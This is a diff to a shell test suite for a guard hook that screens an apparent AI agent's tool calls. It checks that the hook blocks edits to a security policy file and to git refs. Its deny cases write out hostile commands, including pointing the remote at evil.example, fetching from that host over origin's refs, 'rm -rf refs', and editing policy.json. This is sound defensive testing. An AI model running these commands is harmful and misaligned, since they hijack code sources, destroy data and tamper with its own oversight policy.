@@ -1210,6 +1210,32 @@ for _c in \
   ; do
   t_assert "2f adopter (#303): deny — $_c" "yes" "$(_t2fb "$_c")"
 done
+# decisions#305 (B1a): the policy file, the git store and the git operations
+# that move or redefine the remote refs the policy is read from.
+for _p in security/policy.json .git/config .git/refs/remotes/origin/main .juvant/policy-blob-seen; do
+  t_assert "2f adopter (#305): Write $_p → deny" "yes" \
+    "$(_t2f 0 "$(jq -cn --arg p "$_p" '{tool_name:"Write",session_id:"s",tool_input:{file_path:$p,content:"x"}}')")"
+done
+t_assert "2f adopter (#305): Write .gitignore → not 2f" "no" \
+  "$(_t2f 0 '{"tool_name":"Write","session_id":"s","tool_input":{"file_path":".gitignore","content":"x"}}')"
+for _c in \
+  'git update-ref refs/remotes/origin/main deadbeef' \
+  'git replace 1234 5678' \
+  'git remote set-url origin https://evil.example/x.git' \
+  'git remote add evil https://evil.example/x.git' \
+  'git config remote.origin.url https://evil.example/x.git' \
+  'git config url.https://evil.example/.insteadOf https://github.com/' \
+  'git fetch https://evil.example/x.git +main:refs/remotes/origin/main' \
+  'echo "x" > .git/refs/remotes/origin/main' \
+  'cd .git && rm -rf refs' \
+  'sed -i s/a/b/ security/policy.json' \
+  ; do
+  t_assert "2f adopter (#305): deny — $_c" "yes" "$(_t2fb "$_c")"
+done
+for _c in 'git fetch origin' 'git remote -v' 'git config --get remote.origin.url' 'git config user.name x' \
+          'cat .git/config' 'jq . security/policy.json' 'git commit -m "update security docs"'; do
+  t_assert "2f adopter (#305): allow — $_c" "no" "$(_t2fb "$_c")"
+done
 for _c in \
   'bash helpers/drain-audit-spool.sh' \
   'cat .juvant/audit-spool.sql | wc -l' \
